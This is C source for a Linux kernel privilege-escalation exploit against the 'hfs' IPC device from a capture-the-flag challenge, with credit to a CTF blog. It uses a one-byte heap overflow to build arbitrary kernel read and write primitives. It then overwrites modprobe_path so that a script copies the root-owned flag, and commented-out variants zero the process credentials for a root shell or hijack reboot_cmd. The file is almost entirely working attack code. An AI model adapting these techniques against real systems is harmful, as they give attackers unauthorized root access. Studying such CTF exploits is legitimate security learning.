#include <fcntl.h>

#define CHANNEL_CREATE 0xABCD0001
#define CHANNEL_DELETE 0xABCD0002
#define CHANNEL_READ 0xABCD0003
#define CHANNEL_WRITE 0xABCD0004

struct channel_info {
    long id;
    long size;
    char *buffer;
};

int ioctl(int fd, unsigned long request, unsigned long param) {
    return syscall(16, fd, request, param);
}

// Create a new hfs channel
void create_channel(int fd, int id, int size) {
    struct channel_info channel;

    channel.id = id;
    channel.size = size;

    ioctl(fd, CHANNEL_CREATE, &channel);
}

// Delete hfs channel
void delete_channel(int fd, long id) {
    ioctl(fd, CHANNEL_DELETE, &id);
}

// Read from hfs channel into dest
void read_channel(int fd, int id, char *dest, int size) {
    struct channel_info channel;

    channel.id = id;
    channel.size = size;
    channel.buffer = dest;

    ioctl(fd, CHANNEL_READ, &channel);
}

// Write into hfs channel from src
void write_channel(int fd, int id, char *src, int size) {
    struct channel_info channel;

    channel.id = id;
    channel.size = size;
    channel.buffer = src;

    ioctl(fd, CHANNEL_WRITE, &channel);
}

long num[0x500] = {0};
char * buf = num;
int fd=-1, i;
long arb_read(long addr)
{
    num[0] = 2;
    num[1] = addr;
    num[2] = 8;
    write_channel(fd, 0, buf, 0x20);
    read_channel(fd, 2, buf, 8);
    printf("[+] READ: *%p = %p\n", addr, *num);
    return *num;
}

void arb_write(long addr, long data)
{
    printf("[+]WRITE: *%p = %p\n", addr, data);
    num[0] = 2;
    num[1] = addr;
    num[2] = 8;
    write_channel(fd, 0, buf, 0x20);
    num[0] = data;
    write_channel(fd, 2, buf, 8);
}

#define INIT_TASK 0xffffffff81a1b4c0
#define OFFSET_TASKS 0x1d0
#define OFFSET_PID 0x278
#define OFFSET_CRED 0x3c0

int main(int argc, char *argv) {

    printf("[+] Open hfs device\n");
    fd = open("/dev/hfs", O_RDWR);

    if (fd < 0) exit(puts("[!] Error in opening hfs device."));

    create_channel(fd, 0, 0x20);
    create_channel(fd, 1, 0x20);

    delete_channel(fd, 1);

    buf[0x20] = '\x40';  // For user
    // buf[0x20] = '\x60';  // For root
    write_channel(fd, 0, buf, 0x21);

    create_channel(fd, 1, 0x10);
    create_channel(fd, 2, 0x30);

    //*  overwrite modprobe_path method
    long modprobe_path = 0xffffffff81a3f7a0;
    arb_write(modprobe_path + 0x00, *(long *)("/home/user/copy.sh\x00" + 0x00));
    arb_write(modprobe_path + 0x08, *(long *)("/home/user/copy.sh\x00" + 0x08));
    arb_write(modprobe_path + 0x10, *(long *)("/home/user/copy.sh\x00" + 0x10));

    system("echo -ne '#!/bin/sh\n/bin/cp /root/flag /home/user/flag\n/bin/chmod 777 /home/user/flag' > /home/user/copy.sh");
    system("chmod +x /home/user/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/dummy");
    system("chmod +x /home/user/dummy");
    system("/home/user/dummy");
    system("/bin/cat /home/user/flag");
    /**/
    
    /* method copied from kileak blog https://kileak.github.io/ctf/2019/midnight-hfsipc/
    // task_struct definition --> https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L723
    // cred definition        --> https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h#L110
    long task = INIT_TASK;

    while((task = arb_read(task + OFFSET_TASKS + 8) - OFFSET_TASKS) != INIT_TASK)
    {    
        int pid = arb_read(task + OFFSET_PID);

        printf("task = %p, pid = %d\n", (void *) task, pid);

        if(pid != getpid()) 
            continue;        

        puts("found current task!");

        long cred = arb_read(task + OFFSET_CRED);

        for(int i = 0; i < 3; i++) {
            arb_write(cred + i * 8, 0);
        }

        break;
    }

    system("/bin/sh");
    /**/

    /* Trying to hijack poweroff_cmd or reboot_cmd
    // long poweroff_cmd = 0xffffffff81a3f2c0;
    long reboot_cmd = 0xffffffff818085e0;
    arb_write(reboot_cmd, "/home/user/copy.sh\x00", 0x18);

    system("echo -ne '#!/bin/sh\n/bin/cp /root/flag /home/user/flag\nchmod 777 /home/user/flag' > /home/user/copy.sh");
    system("chmod +x /home/user/copy.sh");
    /**/

    close(fd);
    return 0;
}